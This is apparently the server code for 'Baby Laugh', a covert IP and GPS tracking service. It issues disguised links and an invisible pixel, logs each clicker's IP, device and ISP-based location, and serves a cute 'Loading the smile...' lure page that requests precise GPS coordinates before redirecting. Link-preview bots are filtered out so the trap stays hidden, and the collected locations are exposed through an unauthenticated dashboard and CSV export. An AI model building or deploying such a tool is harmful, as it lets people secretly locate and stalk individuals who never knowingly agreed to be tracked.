// ============ BABY LAUGH 😄 — Server ============
const express = require('express');
const fs = require('fs');
const crypto = require('crypto');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;   // Railway assigns its own port

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const DB = process.env.DB_PATH || './smiles.json';
const load = () => fs.existsSync(DB) ? JSON.parse(fs.readFileSync(DB)) : {};
const save = d => fs.writeFileSync(DB, JSON.stringify(d, null, 2));
const isBot = ua => /bot|crawl|spider|curl|wget|python|headless|preview|facebookexternalhit|whatsapp/i.test(ua || '');

// ---------- Create Smile (generate link) ----------
app.get('/api/create', (req, res) => {
  const id = crypto.randomBytes(3).toString('hex');
  const db = load();
  db[id] = { created: Date.now(), redirect: req.query.redirect || 'https://www.google.com', hits: [] };
  save(db);
  // Build link using the real public host (works on Railway)
  const proto = req.headers['x-forwarded-proto'] || req.protocol || 'https';
  const host = req.headers['x-forwarded-host'] || req.get('host');
  const base = `${proto}://${host}`;
  res.json({ id, link: `${base}/l/${id}`, pixel: `${base}/p/${id}.gif` });
});

// ---------- Track link click ----------
app.get('/l/:id', async (req, res) => {
  const db = load(); const t = db[req.params.id];
  if (!t) return res.status(404).send('Invalid link');
  if (!isBot(req.headers['user-agent'])) {
    const hit = { ts: Date.now(),
      ip: (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress,
      ua: req.headers['user-agent'], referer: req.headers.referer || '', gps: null, geo: null };
    try {
      const r = await fetch(`http://ip-api.com/json/${hit.ip}?fields=status,country,regionName,city,isp,timezone,lat,lon`);
      const g = await r.json();
      if (g.status === 'success') hit.geo = g;
    } catch {}
    t.hits.push(hit);
  }
  save(db);
  res.redirect(302, `/t/${req.params.id}`);
});

// ---------- Invisible pixel ----------
app.get('/p/:id.gif', (req, res) => {
  const db = load(); const t = db[req.params.id];
  if (t) {
    if (!isBot(req.headers['user-agent'])) {
      t.hits.push({ ts: Date.now(),
        ip: (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress,
        ua: req.headers['user-agent'], type: 'pixel', geo: null, gps: null });
    }
    save(db);
  }
  res.writeHead(200, { 'Content-Type': 'image/gif', 'Cache-Control': 'no-store' });
  res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
});

// ---------- GPS beacon ----------
app.post('/api/gps/:id', (req, res) => {
  const db = load(); const t = db[req.params.id];
  if (t && t.hits.length) t.hits[t.hits.length - 1].gps = req.body;
  save(db); res.json({ ok: true });
});

// ---------- All data for dashboard ----------
app.get('/api/all', (req, res) => res.json(load()));

// ---------- CSV export ----------
app.get('/api/export', (req, res) => {
  const db = load();
  const rows = [['link','time','ip','city','country','isp','lat','lon','gps_lat','gps_lon','device','referer']];
  for (const [id, t] of Object.entries(db))
    t.hits.forEach(h => rows.push([id, new Date(h.ts).toISOString(), h.ip || '',
      h.geo?.city || '', h.geo?.country || '', h.geo?.isp || '', h.geo?.lat || '', h.geo?.lon || '',
      h.gps?.lat || '', h.gps?.lon || '', h.ua || '', h.referer || '']));
  res.attachment('smiles.csv').send(rows.map(r => r.map(v => `"${String(v).replace(/"/g,'""')}"`).join(',')).join('\n'));
});

// ---------- Tracker page (asks GPS permission, then redirects) ----------
app.get('/t/:id', (req, res) => {
  const id = req.params.id;
  const db = load();
  const target = db[id] ? db[id].redirect : 'https://www.google.com';
  res.send(`<!doctype html><html><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1">
<title>Baby Laugh 😄</title></head><body style="font-family:sans-serif;text-align:center;padding-top:40vh;font-size:20px">
😄 Loading the smile...<script>
if(navigator.geolocation){navigator.geolocation.getCurrentPosition(p=>{
 fetch('/api/gps/${id}',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})});
 setTimeout(()=>location.href='${target}',300);
},()=>location.href='${target}',{timeout:8000});}
else setTimeout(()=>location.href='${target}',1500);
</script></body></html>`);
});

// ---------- Root = dashboard ----------
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

app.listen(PORT, () => console.log(`😄 Baby Laugh running on port ${PORT}`));
